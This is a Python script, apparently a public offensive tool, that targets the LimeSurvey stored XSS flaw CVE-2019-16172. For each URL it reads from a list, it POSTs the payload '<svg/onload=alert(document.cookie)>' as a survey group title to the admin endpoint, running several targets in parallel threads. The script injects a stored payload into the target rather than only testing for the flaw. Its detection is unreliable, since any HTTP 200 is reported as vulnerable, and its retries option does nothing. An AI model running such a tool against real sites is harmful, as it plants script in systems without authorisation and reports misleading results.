import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    """Print the script banner with title and author details."""
    banner = f"""
{Fore.CYAN}{Style.BRIGHT}
╔═══════════════════════════════════════════╗
║      LimeSurvey Stored XSS Checker        ║
║           CVE-2019-16172 Scanner          ║
╠═══════════════════════════════════════════╣
║          Author: Trix Cyrus               ║
║          ~ TrixSec Org                    ║
╚═══════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def check_stored_xss(base_url, timeout):
    """Check for Stored XSS (CVE-2019-16172)."""
    payload = "test<svg/onload=alert(document.cookie)>"
    survey_group_create_url = f"{base_url}/admin/survey/group/create"

    try:
        response = requests.post(survey_group_create_url, data={"title": payload}, timeout=timeout)
        if response.status_code == 200:
            return f"{Fore.GREEN}{Style.BRIGHT}[+] Successfully created survey group. Vulnerable (CVE-2019-16172){Style.RESET_ALL}"
        else:
            return f"{Fore.RED}{Style.BRIGHT}[×] Failed to create survey group. Response code: {response.status_code} (Not Vulnerable){Style.RESET_ALL}"
    except RequestException as e:
        return f"{Fore.RED}{Style.BRIGHT}[×] Request failed: {e} (Not Vulnerable){Style.RESET_ALL}"

def read_urls_from_file(file_path):
    """Read URLs from a file."""
    with open(file_path, 'r') as file:
        return [url.strip() for url in file.readlines()]

def run_check_stored_xss(url, timeout, output_file=None):
    result = check_stored_xss(url.rstrip('/'), timeout)
    print(result)
    if output_file:
        with open(output_file, 'a') as file:
            file.write(result + "\n")

def main():
    parser = argparse.ArgumentParser(description="LimeSurvey Stored XSS Checker for CVE-2019-16172")
    parser.add_argument("--url", help="Single URL to check")
    parser.add_argument("--file", help="File containing multiple URLs to check")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads for parallel URL checks (default: 5)")
    parser.add_argument("--retries", type=int, default=3, help="Number of retries for failed requests (default: 3)")
    parser.add_argument("--output", help="File to write output results", required=False)
    args = parser.parse_args()

    urls = []

    if args.url:
        urls.append(args.url)

    if args.file:
        urls.extend(read_urls_from_file(args.file))

    if not urls:
        print(f"{Fore.YELLOW}{Style.BRIGHT}No URLs provided. Use --url or --file to specify URLs.{Style.RESET_ALL}")
        return

    print_banner()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for url in urls:
            executor.submit(run_check_stored_xss, url, args.timeout, args.output)

    if args.output:
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] Results saved to {args.output}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
